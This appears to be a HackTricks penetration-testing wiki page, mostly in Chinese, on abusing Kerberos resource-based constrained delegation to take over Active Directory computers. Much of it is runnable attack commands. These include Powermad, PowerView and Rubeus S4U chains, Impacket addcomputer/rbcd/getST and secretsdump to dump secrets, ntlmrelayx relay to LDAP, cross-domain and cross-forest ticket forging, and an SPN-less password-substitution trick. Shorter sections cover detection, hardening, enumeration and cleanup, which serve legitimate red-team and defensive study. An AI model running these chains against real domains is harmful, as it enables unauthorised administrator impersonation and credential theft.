# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Resource-based Constrained Delegation 基础

这与基础的 [Constrained Delegation](constrained-delegation.md) 类似，但 **不是** 授予某个 **object** 权限，使其能够针对某台机器 **impersonate any user**，而是 Resource-based Constrain Delegation 在 **object** 中 **设置** 哪个对象能够针对它 **impersonate any user**。<sup>[[12]](#references)</sup>

在此情况下，受约束的对象会拥有一个名为 _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ 的属性，其中包含可以针对该对象 impersonate 其他用户的用户名称。

此 Delegation 与其他 Delegation 的另一个重要区别是：任何对机器账户拥有 **write permissions** 的用户（_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_）都可以设置 **_msDS-AllowedToActOnBehalfOfOtherIdentity_**（在其他形式的 Delegation 中则需要 domain admin 权限）。<sup>[[1]](#references)</sup>

### 新概念

在 Constrained Delegation 中，之前提到用户的 _userAccountControl_ 值中的 **`TrustedToAuthForDelegation`** flag 是执行 **S4U2Self** 所必需的。但这并不完全正确。\
实际情况是，即使没有该值，只要你是一个 **service**（拥有 SPN），就可以针对任何用户执行 **S4U2Self**；但是，如果你拥有 **`TrustedToAuthForDelegation`**，返回的 TGS 将是 **Forwardable**，而如果你没有该 flag，返回的 TGS 将不会是 **Forwardable**。

然而，如果在尝试 abuse **basic Constrain Delegation** 时，**S4U2Proxy** 使用的 **TGS** **不是 Forwardable**，则该操作 **不会生效**。但如果你尝试 exploit **Resource-Based constrain delegation**，则可以成功。<sup>[[1]](#references)[[2]](#references)</sup>

### Attack 结构

> 如果你对 **Computer** 账户拥有 **write equivalent privileges**，就可以在该机器上获得 **privileged access**。

假设攻击者已经对受害者 computer 拥有 **write equivalent privileges**。

1. 攻击者 **compromises** 一个拥有 **SPN** 的账户，或 **creates one**（“Service A”）。注意，任何没有其他特殊权限的 _Admin User_ 都可以创建最多 10 个 Computer 对象（**_MachineAccountQuota_**），并为其设置 **SPN**。因此，攻击者可以直接创建一个 Computer 对象并设置 SPN。
2. 攻击者 **abuses its WRITE privilege**，利用其对受害者 computer（ServiceB）的权限进行配置，使 **resource-based constrained delegation** 允许 ServiceA 针对该受害者 computer（ServiceB） **impersonate any user**。
3. 攻击者使用 Rubeus 对 Service A 到 Service B 执行一次完整的 **S4U attack**（S4U2Self 和 S4U2Proxy），目标用户为一个对 Service B 拥有 **privileged access** 的用户。
1. S4U2Self（从已 compromized/created 的 SPN 账户发起）：请求一个 **Administrator to me** 的 **TGS**（Not Forwardable）。
2. S4U2Proxy：使用上一步获得的 **not Forwardable TGS**，请求一个从 **Administrator** 到 **victim host** 的 **TGS**。
3. 即使你使用的是 not Forwardable TGS，由于你正在 exploit Resource-based constrained delegation，该操作仍然会成功。
4. 攻击者可以 **pass-the-ticket** 并 **impersonate** 该用户，从而获得对受害者 ServiceB 的 **access**。<sup>[[1]](#references)</sup>

要检查 domain 的 _**MachineAccountQuota**_，可以使用：
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## 攻击

### 创建计算机对象

你可以使用 **[powermad](https://github.com/Kevin-Robertson/Powermad)：**<sup>[[3]](#references)[[4]](#references)</sup>在域内创建计算机对象。
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### 配置基于资源的约束委派

**使用 activedirectory PowerShell 模块**<sup>[[4]](#references)</sup>
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**使用 powerview**<sup>[[3]](#references)</sup>
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### 执行完整的 S4U attack（Windows/Rubeus）

首先，我们使用密码 `123456` 创建了新的 Computer 对象，因此需要获取该密码的哈希值：<sup>[[3]](#references)[[4]](#references)</sup>
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
这将打印该账户的 RC4 和 AES 哈希值。\
现在可以执行攻击了：<sup>[[3]](#references)[[4]](#references)</sup>
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
使用 Rubeus 的 `/altservice` 参数，只需请求一次即可为更多服务生成更多 tickets：
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> 请注意，用户拥有一个名为 "**Cannot be delegated**" 的属性。如果用户的此属性为 True，则无法冒充该用户。可以在 bloodhound 中查看此属性。

### Linux 工具：使用 Impacket 完成端到端 RBCD（2024+）

如果你从 Linux 环境操作，可以使用官方 Impacket 工具完成完整的 RBCD 链：<sup>[[6]](#references)[[7]](#references)</sup>
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notes
- 如果强制启用 LDAP signing/LDAPS，请使用 `impacket-rbcd -use-ldaps ...`。
- 优先使用 AES keys；许多现代域限制使用 RC4。Impacket 和 Rubeus 都支持仅使用 AES 的流程。
- Impacket 可以为某些工具重写 `sname`（"AnySPN"），但应尽可能获取正确的 SPN（例如 CIFS/LDAP/HTTP/HOST/MSSQLSvc）。

## Cross-domain & cross-forest RBCD

如果你控制的 **delegating principal** 位于与 **resource computer** 不同的域（甚至不同的 forest）中，滥用方式仍然是 **RBCD**，但 ticket flow 不再是通常的单域 `S4U2Self -> S4U2Proxy`。

### Cross-domain RBCD: configure the foreign principal by SID

当你从 **不同的域** 设置 `msDS-AllowedToActOnBehalfOfOtherIdentity` 时，foreign machine/user 可能无法在目标域 LDAP 中通过名称解析。在这种情况下，应使用 foreign principal 的 **SID**，而不是其 sAMAccountName/UPN，来配置 delegation entry。

当通过 `ntlmrelayx.py` 将 NTLM relay 到 LDAP 时，这一点尤其重要：<sup>[[9]](#references)</sup>
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Notes:
- `--sid` 告诉 `ntlmrelayx.py` 将 `--escalate-user` 视为 SID；当 delegating account 属于目标域之外时，这是必需的。
- 即使工具打印 `User not found in LDAP`，delegation write 仍可能成功，因为 security descriptor 会直接存储 foreign SID。

### Cross-domain RBCD：cross-realm S4U sequence

一旦 foreign principal 被写入 `msDS-AllowedToActOnBehalfOfOtherIdentity`，可用的 cross-domain 流程为：<sup>[[9]](#references)[[13]](#references)</sup>

1. 从 delegating principal 所属的域获取其 **TGT**。
2. 请求 `krbtgt/<target-domain>` 的 **referral TGT**。
3. 在 target-domain DC 上为被 impersonate 的用户请求 **cross-realm S4U2Self referral**。
4. 返回 delegator domain，为该用户请求实际的 **S4U2Self** ticket。
5. 在 delegator domain 中执行 **S4U2Proxy**，获取指向 target domain 的 referral ticket。
6. 在 target-domain DC 上执行最终的 **S4U2Proxy**，获取 `cifs/host.target`、`host/host.target` 等 service ticket。

这就是 stock Linux tooling 经常在 cross-domain RBCD 中失败的原因：<sup>[[9]](#references)</sup>
- 请求的 **realm** 可能需要与 `TGS-REQ` 中使用的 TGT 所属 realm 不同
- 该链需要**独立的 S4U2Proxy 步骤**，而不仅是 `S4U2Self`，或紧接着单次 `S4U2Proxy` 的 `S4U2Self`

### Cross-domain RBCD from Linux

Synacktiv 发布了一个 Impacket `getST.py` 实现，通过显式处理两个 KDC，从 Linux 复现 cross-realm sequence：<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
在实际操作中，新增参数如下：
- `-dc-ip`：**delegating** domain 的 DC
- `-targetdomain`：**resource computer** 所属的 domain
- `-targetdc`：**resource** domain 的 DC

### Cross-forest RBCD limitations

Cross-forest RBCD 存在一个重要限制：**被 impersonate 的用户必须属于与 delegating principal 相同的 forest**。换句话说，如果你控制的 machine account 位于 `valhalla.local`，而目标 resource 位于 `asgard.local`，通常**无法**通过 RBCD 将任意 `asgard.local` 用户 impersonate 到该 resource。<sup>[[9]](#references)</sup>

以下情况下仍然可以利用：
- **delegating forest** 中的用户是另一 forest 的 resource host 上的 **local admin**（或具有其他特权）
- trust 允许所需的 authentication path，并且目标 computer 的 security descriptor 接受该 foreign SID

### Cross-forest RBCD protocol quirks

Cross-forest RBCD 不只是“cross-domain 加上一个 trust”。观察到的流程包含两个常见 tooling 历史上遗漏的 quirks：<sup>[[9]](#references)</sup>

1. 一个额外的 **S4U2Proxy** request，用于设置 **`PA-PAC-OPTIONS=branch-aware`**
2. 最终的 service ticket 可能使用 **RC4** 返回，即使 request 中指定了其他 etypes

实际流程如下：

1. 在 forest A 中为 delegating principal 获取 TGT。
2. 在 forest A 中为被 impersonate 的用户 request **S4U2Self**。
3. 在 forest A 中 request **S4U2Proxy**，以获取 forest B 的 referral TGT。
4. 在 forest A 中再次发送 **S4U2Proxy**，**不将 S4U2Self ticket 作为 additional ticket**，但启用 `branch-aware`，以获取 forest B 的另一个 referral TGT。
5. 可选：在 forest B 中为 delegating principal request 一个普通的 service ticket（最终 abuse 不需要此 ticket）。
6. 使用步骤 3 和 4 中的 referral tickets，在 forest B 中为被 impersonate 的 forest-A 用户 request 到目标 SPN 的最终 **S4U2Proxy** ticket。

### Cross-forest RBCD from Linux

相同的 Synacktiv Impacket branch 为此逻辑新增了一个 `-forest` switch：<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### 递归多域 RBCD（3+ 个域）

在**多域林**中，**S4U2Self**和**S4U2Proxy**都可以进行**递归**，而不是在一次 referral 后停止：

- **递归 S4U2Self**：第一个 `S4U2Self` 会发送到**被冒充用户所在的域**，中间的父域/子域跳转通过针对 `krbtgt/<REALM>` 的正常 `TGS-REQ` referral 完成，而**最终的 `S4U2Self`** 会发送到**委派主体自己的域**。
- 这意味着，**仅持有机器账户的 TGT**，就可能足以冒充同一林中另一个域的**管理员**，并请求 `cifs/host`、`host/host`、`wsman/host` 等服务。
- **递归 S4U2Proxy** 以相同方式沿信任链执行：中间跳转在请求下一个 `krbtgt/<REALM>` referral 时，复用前一个 ticket 作为 TGT，只有最后一跳会返回最终的 service ticket。<sup>[[10]](#references)</sup>

一个实际的同林示例是：
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### SPN-less 跨域 / 跨林 RBCD

如果 **delegating principal 是没有 SPN 的用户**，最后一次递归 `S4U2Self` 会因 **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** 而失败。解决方法是**仅将最后一跳重试为 `S4U2Self+U2U`**。<sup>[[10]](#references)</sup>

滥用链简要流程：

1. 使用 **NT hash** 进行身份验证，使 KDC 倾向于使用 **RC4-HMAC (etype 23)**。
2. 首先请求 **`-self -u2u`**，并将该票据与后续的 proxy 步骤分开保存。
3. 使用 `describeTicket.py` 提取 **TGT session key**。
4. 使用 `changepasswd.py -newhashes <session_key>` 将用户的 **NT hash** 替换为该 **session key**。
5. 在单独的 **`-proxy`** 请求期间，将 `S4U2Self+U2U` 票据作为 **`-additional-ticket`** 重用。
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
操作注意事项：

- 当**第一个受信任跃点已经是另一个 forest**时，优先使用**支持分支的**算法（`getST.py ... -forest`），以匹配原生 Windows 行为。如果 foreign forest 只在链路的**后续位置**才到达，则不支持分支的递归流程仍可能正常工作。<sup>[[9]](#references)</sup>
- 在较新的 **Windows Server 2022/2025** DC 上，由于 RC4 已被弃用，强制使用 RC4 可能会失败并出现 **`KDC_ERR_ETYPE_NOSUPP`**；这可能导致 **无 SPN 的 RBCD** 无法使用，即使经典的、基于 SPN 的 RBCD 仍可通过 AES 工作。<sup>[[15]](#references)</sup>
- 在修改用户的 hash/password 之前运行 **`S4U2Self+U2U`**：`SamrChangePasswordUser` **不会重新计算账户的 Kerberos AES 密钥**，因此先修改 password 可能会导致后续 ticket 请求失败。<sup>[[14]](#references)</sup>
- 被 impersonate 的账户必须仍然**允许 delegation**：**Protected Users** 以及设置了 **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** 的账户都会阻断该链路。

## 检测 / 加固说明

- 跨 domain/forest 的 RBCD 路径通常仍通过 **ACL abuse** 或 **relay-to-LDAP** 建立。在 DC 上强制启用 **LDAP signing** 和 **LDAP channel binding**，以阻断常见的设置路径。
- 审计哪些主体可以在 computer 对象上写入 `msDS-AllowedToActOnBehalfOfOtherIdentity`，并解析其中存储的 SIDs，包括 **foreign security principals**。
- 在 trust 较多的环境中，检查 **Selective Authentication**、**SID filtering**，以及来自 foreign forest 的用户是否在 resource host 上拥有 **local admin** 权限。

### 访问

最后一条命令行将执行**完整的 S4U attack，并在内存中将 TGS 从 Administrator 注入到 victim host**。\
在此示例中，请求的是 Administrator 到 **CIFS** service 的 TGS，因此你将能够访问 **C$**：
```bash
ls \\victim.domain.local\C$
```
### 滥用不同的 service tickets

了解[**此处提供的 service tickets**](silver-ticket.md#available-services)。

## 枚举、审计和清理

### 枚举已配置 RBCD 的计算机

PowerShell（解码 SD 以解析 SIDs）：
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket（使用一条命令读取或刷新）：
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### 清理 / 重置 RBCD

- PowerShell（清除该属性）：
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos Errors

- **`KDC_ERR_ETYPE_NOTSUPP`**：这意味着 Kerberos 被配置为不使用 DES 或 RC4，而你只提供了 RC4 hash。至少向 Rubeus 提供 AES256 hash（或同时提供 rc4、aes128 和 aes256 hash）。示例：`[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- 对普通用户执行 `-self` 时出现 **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**：delegating principal 可能**没有 SPN**。将**最后一跳**改为 **`S4U2Self+U2U`**，而不是常规的 **`S4U2Self`**。<sup>[[10]](#references)</sup>
- 执行 **SPN-less RBCD** 时出现 **`KDC_ERR_ETYPE_NOSUPP`**：较新的 DC 可能会拒绝 **`S4U2Self+U2U` + session-key-substitution** 技巧所需的强制 **RC4-HMAC** 路径。改用经典的、由 **SPN-backed** RBCD 支持并使用 AES 的路径。<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**：这意味着当前计算机的时间与 DC 的时间不同，导致 Kerberos 无法正常工作。
- **`preauth_failed`**：这意味着给定的用户名和 hash 无法用于登录。生成 hash 时可能忘记在用户名中加入 `$`（`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`）。
- **`KDC_ERR_BADOPTION`**：这可能意味着：
- 你尝试 impersonate 的用户无法访问目标 service（因为你无法 impersonate 该用户，或该用户没有足够的权限）
- 请求的 service 不存在（例如请求 winrm 的 ticket，但 winrm 并未运行）
- 创建的 fakecomputer 已失去对 vulnerable server 的权限，你需要重新授予这些权限。
- 你正在滥用 classic KCD；请记住，RBCD 可以使用 non-forwardable S4U2Self tickets，而 KCD 要求 forwardable tickets。

## Notes、relays 和 alternatives

- 如果 LDAP 被过滤，也可以通过 AD Web Services（ADWS）写入 RBCD SD。参见：


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay chains 经常以 RBCD 结束，从而通过一步操作获得 local SYSTEM。参见实际的端到端示例：


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- 如果 LDAP signing/channel binding 被**禁用**，并且你可以创建 machine account，像 **`KrbRelayUp`** 这样的 tools 就可以将被强制发起的 Kerberos auth relay 到 LDAP，为目标 computer object 上的 machine account 设置 `msDS-AllowedToActOnBehalfOfOtherIdentity`，然后通过 off-host 的 S4U 立即 impersonate **Administrator**。<sup>[[8]](#references)</sup>

## References

- [1] [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [2] [Another Word on Delegation](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Computer Object Takeover](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Resource-Based Constrained Delegation Abuse](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity Killed the Domain: An Offensive Kerberos Overview](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (official)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Quick Linux cheatsheet with recent syntax](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Exploring cross-domain & cross-forest RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Exploring cross-domain & cross-forest RBCD: part 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Kerberos constrained delegation overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Detect and remediate RC4 usage in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
